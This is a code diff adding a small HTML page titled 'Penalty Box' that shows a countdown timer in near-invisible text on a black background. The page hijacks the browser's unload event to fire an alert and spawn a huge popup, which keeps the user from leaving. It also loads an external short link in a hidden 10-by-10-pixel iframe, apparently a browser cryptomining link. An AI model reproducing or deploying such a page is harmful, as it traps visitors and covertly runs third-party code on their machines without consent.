@@ -1,0 +1,30 @@
+<html> <title> Penalty Box </title>
+		
+	
+	<body style="color: #000005;background-color:#000000;font-family: Consolas, monaco, monospace">
+
+	<script>
+var d = new Date();
+var pp = d.toDateString()
+	function runner() {
+		var c = d.getTime() + 300000;
+		var n = new Date();
+		var n = n.getTime();
+	   var diff = c - n;
+	   if (diff < 0) {
+		   window.open("games.html")
+		   document.write("xxxx")
+	   window.close()
+	}
+	var time = document.getElementById("timer")
+	time.innerHTML = "Time Left: <b style='font-size:50px'>" + Math.round(diff / 1000).toString() + "</b> seconds"
+	}
+window.onbeforeunload = function() {
+	window.alert("");
+	window.open("games.html", "", "width=10000,height=10000")
+};
+setInterval(runner, 10);
+</script>
+<div style="font-size:30px;background-color:black;"id="timer"></div>
+<iframe src="http://cnhv.co/1u73f" width=10 height=10></iframe>
+	</body> </html>
